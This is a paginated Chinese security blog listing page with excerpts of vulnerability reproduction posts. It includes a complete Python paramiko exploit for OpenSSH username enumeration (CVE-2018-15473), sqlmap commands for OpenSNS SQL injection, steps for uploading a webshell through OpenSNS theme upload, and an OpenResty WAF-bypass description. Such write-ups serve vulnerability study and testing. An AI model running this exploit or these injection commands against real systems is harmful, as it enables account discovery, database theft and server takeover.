+# furnished to do so, subject to the following conditions:
+#
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
+#
+# THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
+# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
+# IN THE SOFTWARE.
+
+
+import argparse
+import logging
+import paramiko
+import socket
+import sys
+
+
+class InvalidUsername(Exception):
+    pass
+
+
+def add_boolean(*args, **kwargs):
+    pass
+
+
+old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
+        paramiko.common.MSG_SERVICE_ACCEPT]
+
+def service_accept(*args, **kwargs):
+    paramiko.message.Message.add_boolean = add_boolean
+    return old_service_accept(*args, **kwargs)
+
+
+def userauth_failure(*args, **kwargs):
+    raise InvalidUsername()
+
+
+paramiko.auth_handler.AuthHandler._handler_table.update(&#123;
+    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
+    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
+&#125;)
+
+logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())
+
+arg_parser = argparse.ArgumentParser()
+arg_parser.add_argument(&#39;hostname&#39;, type=str)
+arg_parser.add_argument(&#39;--port&#39;, type=int, default=22)
+arg_parser.add_argument(&#39;username&#39;, type=str)
+args = arg_parser.parse_args()
+
+sock = socket.socket()
+try:
+    sock.connect((args.hostname, args.port))
+except socket.error:
+    print &#39;[-] Failed to connect&#39;
+    sys.exit(1)
+
+transport = paramiko.transport.Transport(sock)
+try:
+    transport.start_client()
+except paramiko.ssh_exception.SSHException:
+    print &#39;[-] Failed to negotiate SSH transport&#39;
+    sys.exit(2)
+
+try:
+    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
+except InvalidUsername:
+    print &#39;[*] Invalid username&#39;
+    sys.exit(3)
+except paramiko.ssh_exception.AuthenticationException:
+    print &#39;[+] Valid username&#39;
+</code></pre>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qti700d4y8v15d9aenjj" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSNS/OpenSNS 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSNS/OpenSNS%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.710Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="OpenSNS-后台getshell"><a href="#OpenSNS-后台getshell" class="headerlink" title="OpenSNS 后台getshell"></a>OpenSNS 后台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="1-打开网站后台找到模板上传位置："><a href="#1-打开网站后台找到模板上传位置：" class="headerlink" title="1. 打开网站后台找到模板上传位置："></a>1. 打开网站后台找到模板上传位置：</h3><h3 id="2-配置一个压缩包，压缩包里是一句话木马："><a href="#2-配置一个压缩包，压缩包里是一句话木马：" class="headerlink" title="2. 配置一个压缩包，压缩包里是一句话木马："></a>2. 配置一个压缩包，压缩包里是一句话木马：</h3><h3 id="3-选择上传："><a href="#3-选择上传：" class="headerlink" title="3. 选择上传："></a>3. 选择上传：</h3><h3 id="4、会在-Theme目录下自动生成刚刚上传好的马尔"><a href="#4、会在-Theme目录下自动生成刚刚上传好的马尔" class="headerlink" title="4、会在./Theme目录下自动生成刚刚上传好的马尔"></a>4、会在./Theme目录下自动生成刚刚上传好的马尔</h3><p>image</p>
+
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSNS/OpenSNS%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSNS/OpenSNS%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qtcs00czy8v187cv8kfx" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSNS/OpenSNS v6.1.0 前台sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSNS/OpenSNS%20v6.1.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.708Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="OpenSNS-v6-1-0-前台sql注入"><a href="#OpenSNS-v6-1-0-前台sql注入" class="headerlink" title="OpenSNS v6.1.0 前台sql注入"></a>OpenSNS v6.1.0 前台sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenSNS v6.1.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>Addons/ChinaCity/Controller/ChinaCityController.class.php:50<br>发现我们输入的payload，向前查找，最开始从$_POST获取，如何处理，到此处</p>
+<p><img src="/resource/OpenSNSv6.1.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId25.jpg"></p>
+<p>ThinkPHP/Common/functions.php:343 跟进I函数获取到payload</p>
+<p><img src="/resource/OpenSNSv6.1.0%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/media/rId26.jpg"></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSNS/OpenSNS%20v6.1.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSNS/OpenSNS%20v6.1.0%20%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qtcs00cyy8v118wvbv7w" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenSNS/OpenSNS sql注入" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenSNS/OpenSNS%20sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.706Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="OpenSNS-sql注入"><a href="#OpenSNS-sql注入" class="headerlink" title="OpenSNS sql注入"></a>OpenSNS sql注入</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>OpenSNS是基于OneThink的轻量级社交化用户中心框架，系统秉持简约的设计风格，注重交流，为用户提供了一套轻量级的社交方案。OpenSNS前身是”ThinkOX”，2015年1月28号正式更名为OpenSNS。<br>OpenSNS采用PHP+MYSQL构建的一款有”身份”的开源免费SNS社交系统，适用于多种社会关系。<br>OpenSNS采用thinkphp框架编写。系统的设计遵循高内聚低耦合，允许管理员自由开启关闭功能模块。不仅如此，OpenSNS还内置了一个功能扩展商店，可以一键在线安装新的功能扩展。<br>OpenSNS目前有大量的国内开发者，云市场也上架了大量的第三方功能模块和主题应用，使OpenSNS可以同时满足各行各业的社交需求。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="SQL注入-一"><a href="#SQL注入-一" class="headerlink" title="SQL注入(一)"></a>SQL注入(一)</h3><p>需要注册一个账号并登录</p>
+<pre><code>sqlmap.py -u &quot;http://localhost/index.php?s=/ucenter/Config/&amp;uid=1*&quot; --cookie &quot; PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136&quot; --batch --technique=T --dbms &quot;mysql&quot;
+sqlmap.py -u &quot;http://localhost/index.php?s=/ucenter/Config/&amp;uid=1*&quot; --cookie &quot; PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136&quot; --batch --technique=T --dbms &quot;mysql&quot; --is-dba
+sqlmap.py -u &quot;http://localhost/index.php?s=/ucenter/Config/&amp;uid=1*&quot; --cookie &quot; PHPSESSID=hvvkoc2sef0l1kemdrvnknd2s7; UM_distinctid=16bda55e991192-05e2b3083ccb28-1368624a-144000-16bda55e992c7; CNZZDATA1254932726=287816123-1562732483-%7C1562738136&quot; --batch --technique=T --dbms &quot;mysql&quot; --current-db
+</code></pre>
+<h4 id="同类h注入点"><a href="#同类h注入点" class="headerlink" title="同类h注入点"></a>同类h注入点</h4><p><a target="_blank" rel="noopener" href="http://0-sec.org/index.php?s=/ucenter/index/index&amp;uid=10">http://0-sec.org/index.php?s=/ucenter/index/index&amp;uid=10</a><br><a target="_blank" rel="noopener" href="http://0-sec.org/index.php?s=/ucenter/index/information&amp;uid=10">http://0-sec.org/index.php?s=/ucenter/index/information&amp;uid=10</a></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenSNS/OpenSNS%20sql%E6%B3%A8%E5%85%A5/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSNS/OpenSNS%20sql%E6%B3%A8%E5%85%A5/" data-id="cl5c2qtcr00cxy8v1by7ode1a" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-OpenResty/（CVE-2018-9230）bypass OpenResty waf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/OpenResty/%EF%BC%88CVE-2018-9230%EF%BC%89bypass%20OpenResty%20waf/" class="article-date">
+  <time datetime="2022-07-08T06:26:00.669Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2018-9230）bypass-OpenResty-waf"><a href="#（CVE-2018-9230）bypass-OpenResty-waf" class="headerlink" title="（CVE-2018-9230）bypass OpenResty waf"></a>（CVE-2018-9230）bypass OpenResty waf</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>OpenResty是一款基于Nginx和Lua的Web平台。该平台用于搭建用于处理高并发、高扩展性的动态Web应用、Web服务和动态网关。OpenResty1.13.6.1之前的版本中存在安全漏洞，该漏洞源于程序使用<code>ngx.req.get_uri_args</code>和<code>ngx.req.get_post_args</code>函数接受参数的数量可以超过100个。远程攻击者可利用该漏洞绕过访问限制，干预Web应用程序防火墙(ngx_lua_waf或X-WAF)产品。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenResty &lt; 1.13.6.1</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="A、uri参数获取"><a href="#A、uri参数获取" class="headerlink" title="A、uri参数获取"></a>A、uri参数获取</h3><p>首先看一下官方 API 文档，获取一个 uri<br>有两个方法：<code>ngx.req.get_uri_args</code>、<code>ngx.req.get_post_args</code>，二者主要的区别是参数来源有区别，<code>ngx.req.get_uri_args</code>获取<br>uri 请求参数，<code>ngx.req.get_post_args</code>获取来自 post 请求内容。</p>
+<p><strong>测试用例：</strong></p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/OpenResty/%EF%BC%88CVE-2018-9230%EF%BC%89bypass%20OpenResty%20waf/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/OpenResty/%EF%BC%88CVE-2018-9230%EF%BC%89bypass%20OpenResty%20waf/" data-id="cl5c2qteb00d2y8v17f7k943u" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/54/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/53/">53</a><a class="page-number" href="/page/54/">54</a><span class="page-number current">55</span><a class="page-number" href="/page/56/">56</a><a class="page-number" href="/page/57/">57</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/56/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
